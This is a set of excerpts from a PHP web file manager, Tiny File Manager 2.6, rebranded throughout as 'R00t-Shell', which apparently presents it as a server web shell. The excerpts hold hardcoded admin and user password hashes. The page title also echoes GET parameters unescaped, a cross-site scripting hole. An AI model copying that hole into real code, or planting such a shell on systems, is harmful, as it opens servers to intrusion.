...
define('VERSION', '2.6');
define('APP_TITLE', 'Tiny File Manager  (R00t-Shell)');
$use_auth = true;
// Logins = array keys; values = bcrypt only. New hashes generated 2026-05-05.
$auth_users = array(
    'admin' => '$2b$10$x0yGleFX2WyuHsRM3hmLLu/IilfQS20/ssdUa1rkl0sIbQnQEsuNK',
    'user' => '$2b$10$D5dbPSm2DdZaqfPd7VoS/OG5TwXA5ZWwiaWdtVecqYqCQXRyQMlCC',
);
...
?>
  ...
  <text x="10" y="70" font-family="'Courier New', monospace" font-size="100" font-weight="bold" fill="#00ff00" stroke="#003500" stroke-width="2" letter-spacing="3">
    R00t
  </text>
</svg>
                                        </div>
                        ...
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="https://github.com/RootShelll/TinyFilemanager" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">CCP Programmers</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p>
                        <h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> Tiny File Manager  (R00t-Shell) <?php echo VERSION; ?></a></h3>
                        </p>
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        <?php if (!FM_READONLY): ?>
            ...
            <div class="col-3 d-none d-sm-block"><a href="https://github.com/RootShelll/TinyFilemanager" target="_blank" class="float-right text-muted">Tiny File Manager (R00t-Shell) <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://github.com/RootShelll/TinyFilemanager" target="_blank" class="float-right text-muted">Tiny File Manager (R00t-Shell) <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
...
class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'Tiny File Manager  (R00t-Shell) <br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
?>
    ...
    <head>
        ...
        <meta name="description" content="Web based File Manager (R00t-Shell) in PHP, Manage your files efficiently and easily with Tiny File Manager (R00t-Shell)">
...
?>
    ...
    <head>
        ...
        <title><?php echo fm_enc(APP_TITLE) ?> | <?php echo (isset($_GET['view']) ? $_GET['view'] : ((isset($_GET['edit'])) ? $_GET['edit'] : "R00t")); ?></title>
        <?php print_external('pre-jsdelivr'); ?>
...
<?php
    ...
    function lng($txt)
    {
        ...
        // English Language
        $tr['en']['AppName']        = 'Tiny File Manager  (R00t-Shell)';
        $tr['en']['AppTitle']       = 'File Manager  (R00t-Shell)';
        $tr['en']['Login']          = 'Sign in';
